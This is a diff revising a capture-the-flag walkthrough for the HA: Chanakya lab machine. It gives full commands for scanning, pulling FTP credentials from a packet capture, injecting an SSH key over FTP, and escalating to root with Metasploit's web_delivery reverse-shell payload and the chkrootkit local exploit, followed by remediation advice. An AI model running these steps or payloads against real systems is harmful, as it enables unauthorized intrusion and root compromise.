@@ -1,175 +1,162 @@
 # HA: Chanakya — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.101 (host-only) |
-| **Difficulty** | Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.101 |
+| **Difficulty** | Medium |
 | **OS** | Linux |
-| **Root Flag** | /root/final.txt |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/ha-chanakya,395/) |
+| **Goal** | Read /root/final.txt |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/ha-chanakya-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → dirb (abuse.txt ROT13 → ashoka.pcapng) → Wireshark FTP stream (ashoka:kautilya) → SSH key injection via FTP → shell → /tmp/logs (chkrootkit) → MSF web_delivery + local/chkrootkit → root
+ROT13-encoded hint in a dirb-discovered text file revealed a packet capture containing FTP credentials in cleartext; FTP write access allowed SSH key injection; chkrootkit local exploit (via Metasploit) escalated to root.
 
 ## Methodology
 
-1. Network discovery and port scan
-2. Enumerate hidden text files on port 80
-3. Decode ROT13 clue, download and analyse PCAP for FTP credentials
-4. SSH in via FTP-uploaded authorized_keys
-5. Identify chkrootkit cron via /tmp/logs
-6. Exploit chkrootkit via Metasploit → root
+1. Recon — nmap discovers FTP (21), SSH (22), HTTP (80)
+2. Enumeration — dirb finds `abuse.txt`; ROT13 decoded to `ashoka.pcapng`; Wireshark reveals FTP creds
+3. Exploitation — FTP write access used to upload SSH public key; login as `ashoka`
+4. Privilege Escalation — chkrootkit local exploit via Metasploit web_delivery + unix/local/chkrootkit
 
----
-
-## Step 1: Network Discovery
+## Step 1: Reconnaissance
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
-nmap -A 192.168.1.101
+nmap -sV -sC -p- 192.168.1.101
 ```
 
-Open ports: **21** (FTP), **22** (SSH), **80** (HTTP).
+Key open ports:
 
-![Nmap scan](images/01-nmap.png)
+| Port | Service |
+|---|---|
+| 21/tcp | FTP (vsftpd) |
+| 22/tcp | SSH (OpenSSH) |
+| 80/tcp | HTTP |
 
----
+Browsing the web root, its source, and linked images reveals no obvious entry point.
 
-## Step 2: Find and Decode abuse.txt
+![Nmap scan results](images/01-nmap.png)
+
+## Step 2: Enumeration — dirb, ROT13 decode, Wireshark
+
+Run dirb searching for `.txt` files:
 
 ```bash
 dirb http://192.168.1.101/ -X .txt
-wget http://192.168.1.101/abuse.txt
-cat abuse.txt
 ```
 
-The contents are ROT13-encoded. Decode them:
+This reveals `/abuse.txt`. The file contents are ROT13-encoded. Decode them:
 
 ```bash
 cat abuse.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
-# → ashoka.pcapng
+# Output: ashoka.pcapng
 ```
 
-Download the PCAP file:
+Download the packet capture:
 
 ```bash
 wget http://192.168.1.101/ashoka.pcapng
 ```
 
----
+Open it in Wireshark and apply the display filter `ftp`. Follow the TCP stream for the FTP session to see credentials in cleartext:
 
-## Step 3: Extract FTP Credentials from PCAP
-
-```bash
-wireshark ashoka.pcapng
+```
+USER ashoka
+PASS kautilya
 ```
 
-Follow the FTP TCP stream. The cleartext credentials appear in the stream:
+![Enumeration: dirb, ROT13, Wireshark FTP stream](images/02-enum.png)
 
-- Username: **ashoka**
-- Password: **kautilya**
+## Step 3: Exploitation — FTP SSH Key Injection
 
-![Wireshark FTP stream](images/02-pcap-wireshark.png)
-
----
-
-## Step 4: SSH Key Injection via FTP
-
-Log in to FTP and create the .ssh directory:
+Login to FTP with the recovered credentials:
 
 ```bash
 ftp 192.168.1.101
-# Username: ashoka  Password: kautilya
+# Username: ashoka
+# Password: kautilya
+```
+
+Create an `.ssh` directory and upload an SSH public key as `authorized_keys`:
+
+```bash
+# On attacker machine
+ssh-keygen -t rsa -f /tmp/ashoka_key -N ""
+
+# In FTP session
 mkdir .ssh
-cd .ssh
+put /tmp/ashoka_key.pub .ssh/authorized_keys
 ```
 
-Generate a key pair on the attacker:
+SSH into the machine as `ashoka`:
 
 ```bash
-ssh-keygen -f /tmp/chanakya_key
-cat /tmp/chanakya_key.pub > /tmp/authorized_keys
+ssh -i /tmp/ashoka_key ashoka@192.168.1.101
 ```
 
-Upload via FTP:
+Explore the system. The file `/tmp/logs` contains chkrootkit output, hinting at the privilege escalation vector:
 
 ```bash
-# back in the ftp session:
-put /tmp/authorized_keys
-bye
-```
-
-SSH in using the private key:
-
-```bash
-ssh ashoka@192.168.1.101 -i /tmp/chanakya_key
-```
-
-![FTP key injection and SSH](images/03-ftp-ssh.png)
-
----
-
-## Step 5: Discover chkrootkit Cron
-
-```bash
-ls /tmp
 cat /tmp/logs
 ```
 
-The logs file shows output from a periodic **chkrootkit** run, confirming it runs as root via cron.
+![FTP-based SSH key injection and initial shell](images/03-exploit.png)
 
----
+## Step 4: Privilege Escalation — chkrootkit Local Exploit
 
-## Step 6: Exploit chkrootkit → Root (Metasploit)
-
-From a Meterpreter session (use `multi/script/web_delivery` to get one first):
+On the attacker machine, set up a Metasploit `web_delivery` payload to obtain a Meterpreter session:
 
 ```bash
-msfconsole -q
+msfconsole
 use exploit/multi/script/web_delivery
-set LHOST <ATTACKER_IP>
-exploit
-# Run the generated one-liner in the ashoka SSH session
+set TARGET 7    # Linux
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST <LHOST>
+set LPORT <LPORT>
+run
 ```
 
-Once the session is open:
+Copy the generated command and execute it from the `ashoka` SSH session. Once the Meterpreter session opens, background it (`background`) and run the chkrootkit escalation:
 
 ```bash
 use exploit/unix/local/chkrootkit
-set SESSION 1
-set LPORT 8888
-exploit
+set SESSION <session_id>
+set LHOST <LHOST>
+set LPORT 5555
+run
 ```
 
-Root shell obtained:
+This drops a root shell on port 5555. Stabilize it:
 
 ```bash
-python -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+![chkrootkit privilege escalation via Metasploit](images/04-privesc.png)
+
+## Step 5: Root Flag
+
+```bash
 id
-# uid=0(root)
-ls /root
+# uid=0(root) gid=0(root) groups=0(root)
+
 cat /root/final.txt
 ```
 
-![chkrootkit Metasploit exploit](images/04-chkrootkit-msf.png)
-
-![Root flag](images/05-root.png)
-
----
+![Root flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **ROT13 obfuscation** is trivially reversible — it is not encryption
-2. **FTP in cleartext** transmits credentials — analyse traffic from any PCAP for credential extraction
-3. **FTP writable .ssh directory** allows SSH key injection without the user's knowledge
-4. **chkrootkit** running as root via cron is a well-known local privilege escalation vector (Metasploit module: `exploit/unix/local/chkrootkit`)
+1. Encoding (ROT13) is not encryption: any publicly accessible file that encodes its contents provides only the illusion of security.
+2. FTP transmits credentials in cleartext; packet captures on the local network trivially expose them.
+3. FTP write access to a user's home directory is effectively equivalent to SSH access if the server accepts key-based authentication.
+4. The chkrootkit local privilege escalation exploits the fact that chkrootkit runs scripts from `/tmp` as root; placing a malicious file there before chkrootkit runs yields root code execution.
 
 ## Remediation
 
-| Vulnerability | Fix |
-|---------------|-----|
-| FTP cleartext credentials | Replace FTP with SFTP; enforce encrypted transport |
-| FTP user can write to ~/.ssh | Restrict FTP chroot and file permissions |
-| chkrootkit cronjob as root | Update chkrootkit or replace with rkhunter; run as non-root where possible |
-| Weak credential obfuscation (ROT13) | Use proper authentication; do not embed credentials in web-accessible files |
+| Vulnerability | Recommended Fix |
+|---|---|
+| ROT13-encoded credential hint | Remove sensitive hints from publicly accessible web paths |
+| FTP cleartext credentials | Replace FTP with SFTP or SCP; disable FTP entirely if not required |
+| FTP write access to home dir | Apply strict FTP chroot and read-only where possible; remove unneeded write permissions |
+| chkrootkit privilege escalation | Update chkrootkit to a patched version; restrict `/tmp` with `noexec` mount option; run chkrootkit as a non-root user or from a read-only path |
